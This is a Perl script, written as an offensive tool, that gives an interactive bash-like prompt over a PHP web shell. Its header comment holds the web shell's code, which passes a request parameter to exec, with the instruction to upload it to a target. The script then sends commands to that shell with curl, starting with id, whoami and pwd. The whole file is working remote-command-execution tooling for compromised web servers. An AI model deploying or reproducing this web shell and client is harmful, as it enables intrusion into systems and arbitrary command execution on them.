#!/opt/local/bin/perl

##########################################################
# This perl script interacts with a simple php shell.    #
# It is designed to act like a standard bash style shell #
# It does have some limitations and is a work in         #
# progress. Enjoy it!                                    #
##########################################################
# Todos:                    #   Limitations/Bugs:        #
# - URL encode EVERYTHING   #   - cd does nothing        #
# - Make a working cd cmd   #   - ctrl-c resets prompt   #
# - separate commands by ;  #     the first time but not #
#   and have them run       #     after that             #
#   separately (split?)     #                            #
# - Fix ctrl-C              #                            #
# - remove global vars      #                            #
# - clean up code, always   #                            #
##########################################################
# Here is the simple shell to upload to the target	 #
# <?php                                                  #
# 	 $cmd = $_REQUEST["shell"];                      #
#	 exec($cmd, $out);                               #
#	 foreach ($out as $line){                        #
#		 echo "$line <br>";                      #
#	 }                                               #
# ?>                                                     #
##########################################################

use warnings;
use strict;
our $pwd; #working directory variable 
our $loc; #web address of web shell
our $user; #user being used to run commands
$SIG{INT} = \&ctrlc; #defines control-C action

############################
# Simple function to strip #
# HTML tags <*> from input #
# parameter. Changes <br>s #
# to \n's as well for      #
# nicer output.            #
############################
sub StripTags{
	if (defined($_[1]) == 1){
		$_[0] =~ s/<br>/\n/g;
	}
	$_[0] =~ s/<\w+>|<\/\w+>//g;
}

sub cd{
#todo
}

sub URLEncode{
#todo
}

############################
# Defines ctrl-c behavior. #
# Kills curl and returns   #
# to the shell.            #
############################
sub ctrlc{
	`killall curl`;
	print "\n";
	shell();
}

############################
# The main shell of the    #
# program. Runs commands   #
# with curl.               #
############################
sub shell{
	print "$pwd $user\$ "; #prints shell-like prompt
	chomp(my $input = <STDIN>);
	#next two lines URL Encode certain characters, to be replaced by URLEncode function
	$input =~ s/ /%20/g;
	$input =~ s/;/%3B/g;
	if ($input eq "quit" || $input eq "exit"){
		exit;
	}
	if ($input =~ m/^cd/){ #not implemented yet
		cd();
	}

	chomp(my $output = `curl -s $loc?shell=$input`); #runs command and captures output
	#clean up output
	StripTags($output,1);
	chomp($output);
	$output =~ s/^\s+|\s+$//g;

	if ($output ne ""){
		print "$output\n";
	}
}

#prompt for, get, and check for existence of a web shell at the user spcified address.
print "Address of shell: ";
chomp($loc = <STDIN>);
if (`curl -s $loc?shell=id` ne ""){
	print "Shell found!\n";
}else{
	print "Shell not found!\n";
	exit;
}

#get current user and working dir for the prompt
$user = `curl -s $loc?shell=whoami`;
StripTags($user);
chomp($user);
$pwd = `curl -s $loc?shell=pwd`;
StripTags($pwd);
chomp($pwd);
$user =~ s/\s+$|^\s+//g;
$pwd =~ s/^\s+|\s+$//g;

#run the shell until "quit" or "exit"
while (1){
	shell();
}
